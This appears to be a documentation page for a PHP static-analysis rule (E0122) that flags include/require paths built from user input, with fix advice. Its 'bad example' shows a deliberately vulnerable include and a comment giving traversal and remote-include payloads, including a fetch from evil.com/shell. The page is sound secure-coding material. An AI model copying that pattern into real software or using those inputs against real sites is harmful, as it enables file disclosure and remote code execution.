# E0122: File inclusion with user input

Using `include` or `require` with a path built from user-controlled input can allow an attacker to include unintended local or remote files.

## Why it matters

File inclusion vulnerabilities can:
- Include and execute malicious PHP files (local or remote)
- Expose sensitive files such as `/etc/passwd`, source code, or configuration files
- Lead to remote code execution in some configurations

## Bad example

```php
$page = $_GET['page'] ?? '';
include "/var/www/pages/$page.php";
// ?page=../../../etc/passwd or ?page=http://evil.com/shell
```

## Good example

```php
$page = $_GET['page'] ?? '';
$allowed = ['home', 'about', 'contact'];
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include "/var/www/pages/$page.php";
```

## What it checks

- `include`, `require`, `include_once`, `require_once` with paths containing tainted input
- `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE` values used directly in include paths

## When it does not report

- The included file name is validated against a whitelist
- Paths are resolved to a fixed directory with `realpath()` verification

## How to fix

1. Do not include files based directly on user input.
2. Use an allowlist of permitted files or pages.
3. Use absolute paths within your application directory.
4. Set `allow_url_fopen = Off` in `php.ini` where appropriate.

## Configuration

E0122 is enabled by default and has no configuration options.
